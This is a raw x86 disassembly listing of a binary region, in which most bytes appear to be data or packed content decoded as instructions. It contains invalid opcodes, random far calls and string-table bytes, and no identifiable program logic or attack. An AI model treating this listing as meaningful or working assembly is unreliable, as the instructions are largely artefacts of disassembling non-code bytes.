  423255:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42325b:	and    eax,0xcfb6075b
  423260:	sub    eax,0x1dd1b27
  423265:	add    BYTE PTR [ebx+0x0],bl
  423268:	add    BYTE PTR [eax],al
  42326a:	pop    edx
  42326b:	pop    ebp
  42326c:	push   ebx
  42326d:	xchg   cl,cl
  42326f:	(bad)  [eax]
  423271:	adc    dh,BYTE PTR [eax+0x58c1f4dd]
  423277:	shl    DWORD PTR [edx-0x35007482],1
  42327d:	into   
  42327e:	in     eax,dx
  42327f:	mov    ecx,0x34069784
  423284:	pop    ds
  423285:	pop    ss
  423286:	dec    ecx
  423287:	in     al,0x11
  423289:	xchg   ecx,eax
  42328a:	add    eax,0x2c23ca5f
  42328f:	test   eax,0xe948b7c8
  423294:	add    al,0x10
  423296:	sub    al,0x7a
  423298:	cmc    
  423299:	jl     0x4232d7
  42329b:	xor    dl,BYTE PTR [esi-0x32]
  42329e:	dec    edx
  42329f:	push   ds
  4232a0:	scas   al,BYTE PTR es:[edi]
  4232a1:	xchg   DWORD PTR [eax+0x6c2d1d07],esi
  4232a7:	imul   edx,DWORD PTR [ebx+0x5b78bb23],0x58
  4232ae:	inc    edx
  4232af:	xchg   edx,eax
  4232b0:	or     BYTE PTR [ebx-0x66],dh
  4232b3:	retf   
  4232b4:	mov    eax,ds:0x6f78dabd
  4232b9:	dec    edi
  4232ba:	jnp    0x423242
  4232bc:	adc    BYTE PTR cs:[ebx-0x277f092f],dh
  4232c3:	xchg   edi,eax
  4232c4:	fild   WORD PTR [eax]
	...
  4232d2:	aaa    
  4232d3:	(bad)  
  4232d4:	out    0xc2,eax
  4232d6:	mul    ebx
  4232d8:	aaa    
  4232d9:	cmc    
  4232da:	xchg   ecx,eax
  4232db:	call   0x1393:0x83feef4
  4232e2:	jbe    0x4232c1
  4232e4:	add    DWORD PTR [eax],eax
  4232e6:	pop    ebx
  4232e7:	add    BYTE PTR [eax],al
  4232e9:	add    BYTE PTR [ecx],ah
  4232eb:	leave  
  4232ec:	inc    edi
  4232ed:	xlat   BYTE PTR ds:[ebx]
  4232ee:	sbb    al,0xc3
  4232f0:	dec    esi
  4232f1:	(bad)  
  4232f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232f3:	int    0xab
  4232f5:	pop    ds
  4232f6:	or     edx,edx
  4232f8:	(bad)  
  4232f9:	inc    esp
  4232fa:	outs   dx,WORD PTR ds:[esi]
  4232fc:	jl     0x423351
  4232fe:	not    BYTE PTR [edi+edx*8]
  423301:	out    0x2a,eax
  423303:	mov    ah,0xde
  423305:	ins    DWORD PTR es:[edi],dx
  423306:	push   eax
  423307:	loop   0x4232e1
  423309:	clc    
  42330a:	inc    ebp
  42330b:	jl     0x423299
  42330d:	jae    0x42338a
  42330f:	pop    esi
  423310:	xchg   edi,eax
  423311:	mov    ah,0x56
  423313:	inc    ecx
  423314:	rol    DWORD PTR [edi],0x56
  423317:	sbb    edi,DWORD PTR [eax-0x71]
  42331a:	aam    0xb9
  42331c:	cmp    esp,ecx
  42331e:	test   al,0x4e
  423320:	xchg   DWORD PTR ds:0xc4406d40,ebp
  423326:	faddp  st(6),st
  423328:	pop    ds
  423329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42332a:	and    BYTE PTR [eax-0x76aa65df],cl
  423330:	push   es
  423331:	sub    al,0x5c
  423333:	outs   dx,DWORD PTR ds:[esi]
  423334:	(bad)  
  423335:	outs   dx,DWORD PTR ds:[esi]
  423336:	test   eax,0xbf9c684d
  42333b:	inc    ebp
  42333c:	jl     0x423337
  42333e:	scas   al,BYTE PTR es:[edi]
  42333f:	jle    0x4232ef
  423341:	fadd   QWORD PTR [edi]
  423343:	clc    
  423344:	mov    DWORD PTR [eax],eax
	...
  423352:	push   ss
  423353:	aad    0xdf
  423355:	out    dx,eax
  423356:	fucomip st,st(7)
  423358:	ss std 
  42335a:	cmp    BYTE PTR [esi+0x1b0c5f3a],al
  423360:	scas   al,BYTE PTR es:[edi]
  423361:	pop    edi
  423362:	rcr    ebp,1
  423364:	add    DWORD PTR [eax],eax
  423366:	pop    ebx
  423367:	add    BYTE PTR [eax],al
  423369:	add    dh,dl
  42336b:	adc    ebp,DWORD PTR cs:[ebx-0x2d]
  42336f:	test   al,0x68
  423371:	ja     0x4233ae
  423373:	push   esp
  423374:	fsub   st,st(1)
  423376:	push   0x266bafb
  42337b:	adc    al,0xe3
  42337d:	inc    edi
  42337e:	shl    DWORD PTR [esi],0xa7
  423381:	(bad)  
  423382:	shl    cl,1
  423384:	push   edx
  423385:	pop    ebp
  423386:	push   0xef4c82e5
  42338b:	nop
  42338c:	(bad)  
  42338d:	mov    dl,BYTE PTR [edi+0x6b]
  423390:	cdq    
  423391:	shl    BYTE PTR [edx+edx*8-0x4e],0x23
  423396:	(bad)  
  423397:	pop    esi
  423398:	sub    al,0x7
  42339a:	or     DWORD PTR [esi+0x14],ecx
  42339d:	xor    dh,bh
  42339f:	push   edi
  4233a0:	sbb    bh,BYTE PTR [ebx+0x5fbf3039]
  4233a6:	std    
  4233a7:	rcl    DWORD PTR [ecx-0x27],1
  4233aa:	fild   DWORD PTR [esi+edx*2]
  4233ad:	call   0xcc16:0x559b6e4a
  4233b4:	test   eax,0x5a88f04f
  4233b9:	aaa    
  4233ba:	cmp    ebp,esp
  4233bc:	ss push 0xeeddf2ee
  4233c2:	pop    esi
  4233c3:	lahf   
  4233c4:	aaa    
	...
  4233d1:	add    BYTE PTR [esi+0x76],ch
  4233d4:	in     al,0xca
  4233d6:	cld    
  4233d7:	fisubr DWORD PTR [esi-0xa]
  4233da:	sbb    BYTE PTR [edx-0x116d6879],dl
  4233e0:	xchg   BYTE PTR [esi+0x2c],ch
  4233e3:	fiadd  WORD PTR [ecx]
  4233e5:	add    BYTE PTR [ebx+0x0],bl
  4233e8:	add    BYTE PTR [eax],al
  4233ea:	rcr    DWORD PTR [esi-0x5fca8311],1
  4233f0:	std    
  4233f1:	xchg   ecx,eax
  4233f2:	mov    esp,0x73f3d733
  4233f7:	or     dl,BYTE PTR [eax+0x1954c7c4]
  4233fd:	lods   al,BYTE PTR ds:[esi]
  4233fe:	dec    esp
  4233ff:	out    0xbf,al
  423401:	and    bh,dh
  423403:	cmp    eax,0x4091d1c8
  423408:	or     BYTE PTR [edi+0x32],cl
  42340b:	mov    cs,WORD PTR [ecx]
  42340d:	outs   dx,BYTE PTR ds:[esi]
  42340e:	out    0x5e,eax
  423410:	sub    eax,0x868f45a6
  423415:	and    ecx,DWORD PTR [ebx+0x3b8ad615]
  42341b:	sbb    ah,0xfc
  42341e:	loope  0x4233f2
  423420:	add    al,0x9e
  423422:	stos   BYTE PTR es:[edi],al
  423423:	pop    ebp
  423424:	and    bl,0x24
  423427:	repnz mov eax,0x96923c0b
  42342d:	int    0xd6
  42342f:	mov    ecx,0xb541afd
  423434:	setno  BYTE PTR [eax+eiz*1]
  423438:	call   0x81658854
  42343d:	pop    ebx
  42343e:	mov    BYTE PTR [eax-0x43],ah
  423441:	pop    ebx
  423442:	pop    edx
  423443:	or     al,0xc3
	...
  423451:	add    BYTE PTR [edx],bh
  423453:	push   edx
  423454:	les    ecx,FWORD PTR [edi]
  423456:	in     al,dx
  423457:	lahf   
  423458:	sti    
  423459:	ja     0x423451
  42345b:	rcl    DWORD PTR [eax-0x102fc72d],1
  423461:	xlat   BYTE PTR ds:[ebx]
  423462:	xchg   esi,ebx
  423464:	add    DWORD PTR [eax],eax
  423466:	pop    ebx
  423467:	add    BYTE PTR [eax],al
  423469:	add    BYTE PTR [esi+ebp*4],bl
  42346c:	rcl    DWORD PTR [ebp-0x51b1927],0x3d
  423473:	dec    eax
  423474:	clc    
  423475:	cmp    ebp,esp
  423477:	dec    esp
  423478:	repz imul edx,DWORD PTR [ebx-0x7],0xffffffe5
  42347d:	shr    ch,0x5f
  423480:	push   0xcc7dd404
  423485:	out    dx,eax
  423486:	sbb    BYTE PTR [ecx+esi*8+0x1d],0xf1
  42348b:	dec    ebp
  42348c:	add    eax,0x38509993
  423491:	popa   
  423492:	ds das 
  423494:	mov    BYTE PTR [ebp-0x4a49b742],ah
  42349a:	jne    0x4234c2
  42349c:	hlt    
  42349d:	sahf   
  42349e:	inc    esi
  42349f:	push   ds
  4234a0:	sub    al,0xdb
  4234a2:	or     BYTE PTR [ecx],ah
  4234a4:	pop    eax
  4234a5:	repz xchg ebx,eax
  4234a7:	nop
  4234a8:	call   0xf972:0x37043b38
  4234af:	int    0xda
  4234b1:	push   esi
  4234b2:	shl    DWORD PTR [edx],1
  4234b4:	mov    ch,0xaf
  4234b6:	int3   
  4234b7:	pop    ss
  4234b8:	std    
  4234b9:	aad    0x55
  4234bb:	mov    al,0x31
  4234bd:	test   al,0x8d
  4234bf:	imul   eax,DWORD PTR [ecx+0x6ca8a048],0x0
	...
  4234d2:	xchg   ebx,eax
  4234d3:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  4234da:	push   eax
  4234db:	loopne 0x4234d7
  4234dd:	call   0xdee2:0xb8e47baa
  4234e4:	add    DWORD PTR [eax],eax
  4234e6:	pop    ebx
  4234e7:	add    BYTE PTR [eax],al
  4234e9:	add    al,ah
  4234eb:	inc    esp
  4234ec:	cmc    
  4234ed:	aaa    
  4234ee:	popf   
  4234ef:	push   esi
  4234f0:	imul   eax,esp,0x77
  4234f3:	jp     0x4234d6
  4234f5:	fs jae 0x423528
  4234f8:	test   BYTE PTR ds:0x1bdca66,cl
  4234fe:	jb     0x423570
  423500:	lahf   
  423501:	outs   dx,BYTE PTR ds:[esi]
  423502:	lds    bp,DWORD PTR [ecx+ebp*8+0x1c523ca1]
  42350a:	cwde   
  42350b:	fwait
  42350c:	outs   dx,BYTE PTR ds:[esi]
  42350d:	add    al,0x14
  42350f:	xchg   esi,eax
  423510:	add    dl,cl
  423512:	pop    ebp
  423513:	jmp    0xeabd18fe
  423518:	add    ch,bl
  42351a:	and    BYTE PTR [edi+0x35749237],cl
  423520:	xchg   DWORD PTR [esi-0x5f],esi
  423523:	lods   eax,DWORD PTR ds:[esi]
  423524:	mov    edi,0xb6d89d38
  423529:	mov    esi,0x7bc01184
  42352e:	aaa    
  42352f:	sub    al,0x17
  423531:	mov    ch,0x10
  423533:	nop
  423534:	cdq    
  423535:	or     DWORD PTR [edi-0x6a],esi
  423538:	mov    ch,0x78
  42353a:	xchg   edi,eax
  42353b:	mov    bh,0x78
  42353d:	mov    eax,0x125c29a3
  423542:	cli    
  423543:	int3   
  423544:	add    al,BYTE PTR [eax]
	...
  423552:	(bad)  
  423554:	test   eax,0xddffeef7
  42355a:	and    al,0x1
  42355c:	pop    ebp
  42355d:	dec    edi
  42355e:	cli    
  42355f:	push   ds
  423560:	int3   
  423561:	icebp  
  423562:	cmp    eax,0x5b0001df
  423567:	add    BYTE PTR [eax],al
  423569:	add    cl,al
  42356b:	jle    0x423517
  42356d:	mov    ss,ecx
  42356f:	fxch   st(5)
  423571:	jne    0x423594
  423573:	stos   BYTE PTR es:[edi],al
  423574:	je     0x4235c8
  423576:	cmp    al,0x7
  423578:	sub    BYTE PTR cs:[edi+0x72],dl
  42357c:	dec    ecx
  42357d:	xor    al,0xfd
  42357f:	daa    
  423580:	arpl   WORD PTR [edi-0x27],bp
  423583:	pop    ecx
  423584:	retf   0x88e1
  423587:	(bad)  
  423588:	ds aad 0x39
  42358b:	bound  edx,QWORD PTR [ebx]
  42358d:	dec    ecx
  42358e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42358f:	cmp    ch,0x11
  423592:	imul   eax,DWORD PTR [esi+0x13],0xfffffff8
  423596:	sub    ebx,DWORD PTR [eax-0x22d5ae78]
  42359c:	or     DWORD PTR [ecx+0x6dd0ee33],eax
  4235a2:	cmp    al,0x67
  4235a4:	and    al,0x96
  4235a6:	inc    ebx
  4235a7:	sbb    esi,DWORD PTR [eax]
  4235a9:	cmp    DWORD PTR [ebp+0x2e2c4e80],0xffffff9f
  4235b0:	ret    
  4235b1:	adc    al,0xaf
  4235b3:	aas    
  4235b4:	push   0x47cfa4e9
  4235b9:	mov    al,0x28
  4235bb:	or     al,0xa
  4235bd:	dec    edi
  4235be:	and    eax,0x84c7e6c1
  4235c3:	pop    ecx
  4235c4:	adc    DWORD PTR [eax],eax
	...
  4235d2:	outs   dx,DWORD PTR ds:[esi]
  4235d3:	mov    ds:0x7edd2ad4,al
  4235d8:	jmp    edi
  4235da:	push   edx
  4235db:	fcmovu st,st(5)
  4235dd:	in     eax,0x8e
  4235df:	sub    edi,DWORD PTR [ecx]
  4235e1:	fstp   QWORD PTR [eax+0x5b0001df]
  4235e7:	add    BYTE PTR [eax],al
  4235e9:	add    cl,cl
  4235eb:	mov    dh,0xac
  4235ed:	addr16 aad 0x5b
  4235f0:	mov    al,ds:0xb13e7e92
  4235f5:	stos   BYTE PTR es:[edi],al
  4235f6:	pushf  
  4235f7:	enter  0x6c90,0x7
  4235fb:	cmp    BYTE PTR [eax],0xfc
  4235fe:	clc    
  4235ff:	xchg   ebp,eax
  423600:	fwait
  423601:	push   DWORD PTR ds:0x81694319
  423607:	dec    eax
  423608:	pop    esp
  423609:	and    eax,0x69f80a03
  42360e:	scas   eax,DWORD PTR es:[edi]
  42360f:	cs lock push ds
  423612:	aas    
  423613:	mov    BYTE PTR ds:0x15b89325,dl
  423619:	or     DWORD PTR [ecx+0x4c9ea4ed],ebp
  42361f:	mov    bh,0xec
  423621:	or     eax,0x128b6871
  423626:	pop    ecx
  423627:	loope  0x423653
  423629:	(bad)  
  42362a:	jo     0x4236a3
  42362c:	(bad)  
  42362d:	adc    DWORD PTR [ebx],esp
  42362f:	imul   esi,esp,0x5f0ab4ec
  423635:	imul   edx,ecx,0xffffff90
  423638:	dec    esp
  423639:	jl     0x4236b4
  42363b:	in     al,0x25
  42363d:	fild   DWORD PTR ds:0x42c8cefc
  423643:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
	...
  423651:	add    cl,bh
  423653:	sbb    al,al
  423655:	inc    esi
  423656:	jecxz  0x423636
  423658:	(bad)  
  423659:	mov    edi,0xe1f1bc83
  42365e:	mov    esp,edx
  423660:	mov    ebx,0x1dff3ca
  423665:	add    BYTE PTR [ebx+0x0],bl
  423668:	add    BYTE PTR [eax],al
  42366a:	mov    eax,0xb51fe6a8
  42366f:	mov    DWORD PTR [edi-0x71],ecx
  423672:	(bad)  
  423673:	dec    edx
  423674:	(bad)  
  423675:	or     dl,BYTE PTR [ebp-0x3315fe85]
  42367b:	je     0x423649
  42367d:	xchg   edi,eax
  42367e:	mov    esp,0x88e55b13
  423683:	inc    ebp
  423684:	add    al,0xed
  423686:	inc    ebx
  423687:	sub    dh,ah
  423689:	dec    edx
  42368a:	pop    ds
  42368b:	pop    ebp
  42368c:	mov    ah,ch
  42368e:	sbb    dh,BYTE PTR [edi]
  423690:	pop    edi
  423691:	mov    edi,0xc6134bc8
  423696:	mov    BYTE PTR ds:0x3bced466,ah
  42369c:	not    BYTE PTR [esi+eax*2]
  42369f:	dec    esp
  4236a0:	sbb    dl,ch
  4236a2:	pop    es
  4236a3:	fistp  DWORD PTR [ecx]
  4236a5:	retf   0xce93
  4236a8:	cdq    
  4236a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236aa:	mov    cs:0x8574c3cb,al
  4236b0:	push   ds
  4236b1:	adc    al,BYTE PTR ds:0xea0bc147
  4236b7:	fistp  WORD PTR [eax]
  4236b9:	popf   
  4236ba:	push   0x53
  4236bc:	or     esp,DWORD PTR [edi+0x148afde9]
  4236c2:	clc    
  4236c3:	jae    0x4236ae
	...
  4236d1:	add    BYTE PTR [ecx+0x3e8336b9],ah
  4236d7:	(bad)  
  4236d8:	mov    ch,0xbb
  4236da:	icebp  
  4236db:	and    eax,0xd3758c27
  4236e0:	xchg   ebp,eax
  4236e1:	lods   al,BYTE PTR ds:[esi]
  4236e2:	dec    esi
  4236e3:	loopne 0x4236e6
  4236e5:	add    BYTE PTR [ebx+0x0],bl
  4236e8:	add    BYTE PTR [eax],al
  4236ea:	mov    ch,al
  4236ec:	mov    dl,0x4
  4236ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236ef:	ret    
  4236f0:	add    eax,0x779b14c0
  4236f5:	call   0x84cd:0x4e33e43f
  4236fc:	sub    DWORD PTR [edi-0x7c100944],edi
  423702:	(bad)  
  423703:	aam    0xcb
  423705:	add    DWORD PTR [ebx],0xb49f36b8
  42370b:	mov    ds:0xea7f655c,al
  423710:	out    0x6d,eax
  423712:	dec    ebp
  423713:	std    
  423714:	jecxz  0x4236c9
  423716:	ins    DWORD PTR es:[edi],dx
  423717:	clc    
  423718:	mov    WORD PTR [edi],cs
  42371a:	cmc    
  42371b:	mov    dh,0x67
  42371d:	dec    ebp
  42371e:	or     al,0x3f
  423720:	sub    BYTE PTR [esi+0x66],al
  423723:	mov    al,ds:0x52df876a
  423728:	mov    ecx,0x2a9b3f0c
  42372d:	imul   esi,DWORD PTR [eax],0x48
  423730:	mov    edi,0x50521dd5
  423735:	add    edi,eax
  423737:	add    DWORD PTR ds:0xbf0a8179,esi
  42373d:	inc    ecx
  42373e:	jno    0x4237be
  423740:	jbe    0x42370e
  423742:	lds    edx,FWORD PTR [ebx]
  423744:	mov    ds:0x0,eax
	...
  423751:	add    BYTE PTR [edx],dl
  423753:	xlat   BYTE PTR ds:[ebx]
  423754:	repz or esi,edi
  423757:	das    
  423758:	cli    
  423759:	fist   WORD PTR [ecx]
  42375b:	dec    ebx
  42375c:	es nop
  42375e:	jne    0x4237d8
  423760:	fstp   st(0)
  423762:	test   eax,0x5b0001e0
  423767:	add    BYTE PTR [eax],al
  423769:	add    dl,bh
  42376b:	push   edi
  42376c:	cld    
  42376d:	fistp  WORD PTR [ecx+0x33]
  423770:	pop    edi
  423771:	push   ss
  423772:	addr16 hlt 
  423774:	fdivr  QWORD PTR [eax-0x2b0f4ea4]
  42377a:	or     eax,0x4f406ec2
  42377f:	adc    al,0xc0
  423781:	(bad)  
  423782:	xchg   ecx,eax
  423783:	mov    eax,ds:0x73f41b6c
  423788:	sbb    BYTE PTR ds:0x87bd54d1,bh
  42378e:	sahf   
  42378f:	and    DWORD PTR [eax-0x70],0xc74137e3
  423796:	or     eax,0x6c7edc6e
  42379b:	fistp  DWORD PTR [edi+0x440936cc]
  4237a1:	sbb    al,0x43
  4237a4:	mov    ah,0x16
  4237a6:	or     bh,dl
  4237a8:	(bad)  
  4237a9:	pop    ebx
  4237aa:	es stc 
  4237ac:	sbb    ah,0xf2
  4237af:	in     eax,dx
  4237b0:	cmp    bh,BYTE PTR [ebp+0x62]
  4237b3:	popa   
  4237b4:	(bad)
  4237b7:	cli    
  4237b8:	enter  0xae26,0xfb
  4237bc:	push   esp
  4237bd:	aad    0xcd
  4237bf:	mov    ah,0xa6
  4237c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237c2:	cwde   
  4237c3:	sar    DWORD PTR [eax+0x0],cl
	...
  4237d2:	add    al,al
  4237d4:	inc    edx
  4237d5:	add    BYTE PTR [eax+eax*8],al
  4237d8:	inc    edx
  4237d9:	add    BYTE PTR [eax],cl
  4237db:	rol    BYTE PTR [edx+0x0],0xc
  4237df:	rol    BYTE PTR [edx+0x0],0x10
  4237e3:	rol    BYTE PTR [edx+0x0],0x14
  4237e7:	rol    BYTE PTR [edx+0x0],0x18
  4237eb:	rol    BYTE PTR [edx+0x0],0x1c
  4237ef:	rol    BYTE PTR [edx+0x0],0x57
  4237f3:	inc    edi
  4237f4:	cmp    DWORD PTR [edi+0x41],ebx
  4237f7:	pop    eax
  4237f8:	ss push esi
  4237fa:	pop    edi
  4237fb:	cmp    BYTE PTR [eax],al
  4237fd:	inc    ebx
  4237fe:	inc    ebp
  4237ff:	dec    esp
  423800:	pop    edi
  423801:	pop    eax
  423802:	push   edi
  423803:	dec    eax
  423804:	inc    edx
  423805:	add    BYTE PTR [edi+0x50],dl
  423808:	xor    eax,0x4641365f
  42380d:	cmp    DWORD PTR [edx],esi
  42380f:	xor    ebx,DWORD PTR [edi+0x32]
  423812:	aaa    
  423813:	add    BYTE PTR [eax+0x48],dl
  423816:	xor    BYTE PTR [edi+0x58],bl
  423819:	push   esp
  42381a:	inc    ecx
  42381b:	dec    ebp
  42381c:	push   ecx
  42381d:	pop    edi
  42381e:	inc    esi
  42381f:	push   ebp
  423820:	cmp    DWORD PTR [eax],eax
  423822:	push   edi
  423823:	push   ebp
  423824:	inc    ecx
  423825:	xor    dh,BYTE PTR [ebx]
  423827:	xor    ebx,DWORD PTR [edi+0x4e]
  42382a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42382e:	cmp    DWORD PTR [edi+0x38],ebx
  423831:	dec    ecx
  423832:	cmp    DWORD PTR [edx+0x36],ebx
  423835:	pop    edi
  423836:	dec    edx
  423837:	xor    BYTE PTR [edx+0x34],cl
  42383a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42383e:	xor    esi,DWORD PTR [eax]
  423840:	pop    edi
  423841:	inc    edx
  423842:	dec    ebx
  423843:	pop    eax
  423844:	pop    eax
  423845:	xor    eax,0x51414d00
  42384a:	pop    edi
  42384b:	inc    ecx
  42384c:	xor    al,BYTE PTR [ebp+0x5f]
  42384f:	inc    ecx
  423850:	dec    ebx
  423851:	cmp    DWORD PTR ds:0x5a003939,esi
  423857:	inc    ebp
  423858:	cmp    BYTE PTR [edi+0x4d],bl
  42385b:	ss dec eax
  42385d:	dec    ebx
  42385e:	add    BYTE PTR [ebp+0x57],al
  423861:	xor    DWORD PTR [edi+0x31],ebx
  423864:	dec    ebx
  423865:	xor    eax,DWORD PTR [ecx+0x30]
  423868:	push   ebx
  423869:	add    BYTE PTR [edx+esi*1+0x36],al
  42386d:	aaa    
  42386e:	pop    edi
  42386f:	push   edx
  423870:	dec    eax
  423871:	dec    ebp
  423872:	cmp    BYTE PTR [edi+0x37],bl
  423875:	inc    esi
  423876:	xor    eax,0x43355500
  42387b:	pop    edi
  42387c:	pop    ecx
  42387d:	dec    ecx
  42387e:	push   ebx
  42387f:	xor    bl,BYTE PTR [edi+0x52]
  423882:	add    BYTE PTR [eax+0x55],dl
  423885:	dec    ecx
  423886:	xor    BYTE PTR [edi+0x43],bl
  423889:	ss inc ebp
  42388b:	xor    bl,BYTE PTR [edi+0x4d]
  42388e:	xor    al,0x4a
  423890:	push   edx
  423891:	push   ebp
  423892:	add    BYTE PTR [esi+0x39],cl
  423895:	push   eax
  423896:	pop    edi
  423897:	push   ebp
  423898:	cmp    DWORD PTR [esi],esi
  42389a:	xor    BYTE PTR [ecx],dh
  42389c:	pop    edi
  42389d:	dec    edi
  42389e:	dec    esi
  42389f:	push   esp
  4238a0:	cmp    BYTE PTR [eax],al
  4238a2:	dec    esp
  4238a3:	xor    al,0x44
  4238a5:	xor    DWORD PTR [edi+0x4b],ebx
  4238a8:	xor    DWORD PTR [ebp+0x5f],eax
  4238ab:	pop    edx
  4238ac:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238b0:	pop    edi
  4238b1:	inc    edx
  4238b2:	xor    dh,BYTE PTR [ecx]
  4238b4:	push   ebx
  4238b5:	xor    DWORD PTR [ecx],edi
  4238b7:	inc    edx
  4238b8:	add    BYTE PTR [edi+0x45],al
  4238bb:	xor    al,0x38
  4238bd:	xor    BYTE PTR [eax],dh
  4238bf:	pop    edi
  4238c0:	dec    edx
  4238c1:	dec    ebx
  4238c2:	xor    eax,0x33345f4d
  4238c7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238cb:	pop    edi
  4238cc:	aaa    
  4238cd:	push   esi
  4238ce:	dec    ebx
  4238cf:	push   edx
  4238d0:	pop    edi
  4238d1:	inc    ebx
  4238d2:	add    BYTE PTR [edx+0x35],bl
  4238d5:	dec    ebp
  4238d6:	pop    edi
  4238d7:	inc    edi
  4238d8:	dec    esi
  4238d9:	xor    al,0x49
  4238db:	xor    eax,0x54590035
  4238e0:	push   edx
  4238e1:	pop    edi
  4238e2:	push   esp
  4238e3:	inc    ebx
  4238e4:	inc    ecx
  4238e5:	pop    edi
  4238e6:	cmp    DWORD PTR [ecx+0x41],ebx
  4238e9:	push   ebp
  4238ea:	pop    edi
  4238eb:	push   ebp
  4238ec:	inc    ebp
  4238ed:	add    BYTE PTR [esi+esi*1+0x35],cl
  4238f1:	pop    edi
  4238f2:	pop    eax
  4238f3:	dec    edx
  4238f4:	inc    edx
  4238f5:	inc    edi
  4238f6:	add    BYTE PTR [edx+0x36],al
  4238f9:	inc    ebx
  4238fa:	pop    edi
  4238fb:	xor    BYTE PTR ds:0x36464b,dh
  423901:	dec    ebx
  423902:	cmp    DWORD PTR [esi+0x37],eax
  423905:	xor    ebx,DWORD PTR [edi+0x35]
  423908:	ss inc edi
  42390a:	pop    ecx
  42390b:	dec    eax
  42390c:	pop    ecx
  42390d:	add    BYTE PTR [ebp+0x35],cl
  423910:	push   eax
  423911:	xor    BYTE PTR [edi+0x4f],bl
  423914:	pop    ecx
  423915:	xor    cl,BYTE PTR [edi+0x0]
  423918:	pop    ecx
  423919:	xor    DWORD PTR [esi+0x5f],ecx
  42391c:	xor    al,BYTE PTR [edx+0x30]
  42391f:	push   esi
  423920:	push   esp
  423921:	inc    ebp
  423922:	add    BYTE PTR [edi+0x37],al
  423925:	push   esi
  423926:	xor    DWORD PTR [edi+0x49],ebx
  423929:	xor    al,BYTE PTR [esi+0x30]
  42392c:	pop    edi
  42392d:	ss dec esi
  42392f:	cmp    BYTE PTR [eax],al
  423931:	pop    edx
  423932:	xor    eax,0x445f334b
  423937:	xor    BYTE PTR [eax],bh
  423939:	push   ecx
  42393a:	push   esi
  42393b:	xor    al,0x0
  42393d:	push   ebp
  42393e:	pop    eax
  42393f:	inc    edi
  423940:	xor    DWORD PTR [edi+0x39],ebx
  423943:	push   esp
  423944:	inc    ebx
  423945:	aaa    
  423946:	inc    esp
  423947:	add    BYTE PTR [edi+0x39],dl
  42394a:	ss pop edi
  42394c:	dec    eax
  42394d:	pop    edx
  42394e:	pop    ecx
  42394f:	inc    edi
  423950:	push   ebp
  423951:	pop    edi
  423952:	push   eax
  423953:	dec    eax
  423954:	inc    ebx
  423955:	add    BYTE PTR [ebp+0x0],dl
  423958:	xor    al,0x0
  42395a:	dec    edi
  42395b:	add    BYTE PTR [edi+0x0],bl
  42395e:	cmp    BYTE PTR [eax],al
  423960:	xor    al,BYTE PTR [eax]
  423962:	inc    ebx
  423963:	add    BYTE PTR [edx+0x0],bl
  423966:	inc    ebx
  423967:	add    BYTE PTR [edi],dh
  423969:	add    BYTE PTR [edi+0x0],bl
  42396c:	inc    ebx
  42396d:	add    BYTE PTR [eax+eax*1+0x0],al
  423971:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423975:	add    BYTE PTR [edx],dh
  423977:	add    BYTE PTR [edi+0x0],bl
  42397a:	cmp    BYTE PTR [eax],al
  42397c:	dec    esp
  42397d:	add    BYTE PTR [esi+0x0],dl
  423980:	pop    edi
  423981:	add    BYTE PTR [ecx+0x0],bl
  423984:	push   edx
  423985:	add    BYTE PTR [esi+0x0],dl
  423988:	xor    al,BYTE PTR [eax]
  42398a:	cmp    BYTE PTR [eax],al
  42398c:	pop    edi
  42398d:	add    BYTE PTR [edx+0x0],cl
  423990:	add    BYTE PTR [eax],al
  423992:	inc    edx
  423993:	add    BYTE PTR [eax+eax*1+0x46],cl
  423997:	add    BYTE PTR [edi+0x0],bl
  42399a:	xor    eax,DWORD PTR [eax]
  42399c:	inc    ebp
  42399d:	add    BYTE PTR [ecx+0x0],cl
  4239a0:	push   edx
  4239a1:	add    BYTE PTR [ecx],bh
  4239a3:	add    BYTE PTR [esi+0x0],dl
  4239a6:	add    BYTE PTR [eax],al
  4239a8:	dec    ebp
  4239a9:	add    BYTE PTR [edi],dh
  4239ab:	add    BYTE PTR [eax+eax*1+0x5f],al
  4239af:	add    BYTE PTR [edx+0x0],cl
  4239b2:	pop    eax
  4239b3:	add    BYTE PTR [ebx],dh
  4239b5:	add    BYTE PTR [ecx],dh
  4239b7:	add    BYTE PTR [ebx+0x0],al
  4239ba:	add    BYTE PTR [eax],al
  4239bc:	dec    edi
  4239bd:	add    BYTE PTR [esi],dh
  4239bf:	add    BYTE PTR [eax+0x0],cl
  4239c2:	pop    edi
  4239c3:	add    BYTE PTR [eax],dh
  4239c5:	add    BYTE PTR [edi],dh
  4239c7:	add    BYTE PTR [ecx],dh
  4239c9:	add    BYTE PTR [edx+0x0],dl
  4239cc:	xor    eax,0x55000000
  4239d1:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4239d5:	add    BYTE PTR [edi+0x0],bl
  4239d8:	push   esp
  4239d9:	add    BYTE PTR [ecx+0x0],al
  4239dc:	cmp    DWORD PTR [eax],eax
  4239de:	pop    edi
  4239df:	add    BYTE PTR [ebx],dh
  4239e1:	add    BYTE PTR [eax],dh
  4239e3:	add    BYTE PTR [eax],bh
  4239e5:	add    BYTE PTR [edi+0x0],cl
  4239e8:	inc    ebx
  4239e9:	add    BYTE PTR ds:0x4d000000,dh
  4239ef:	add    BYTE PTR [esi+0x0],cl
  4239f2:	inc    ebp
  4239f3:	add    BYTE PTR [edi+0x0],bl
  4239f6:	push   esp
  4239f7:	add    BYTE PTR [esi+0x0],al
  4239fa:	cmp    BYTE PTR [eax],al
  4239fc:	push   ebx
  4239fd:	add    BYTE PTR [edx+0x0],bl
  423a00:	pop    edi
  423a01:	add    BYTE PTR [eax],dh
  423a03:	add    BYTE PTR [eax],bh
  423a05:	add    BYTE PTR [eax+0x0],cl
  423a08:	add    BYTE PTR [eax],al
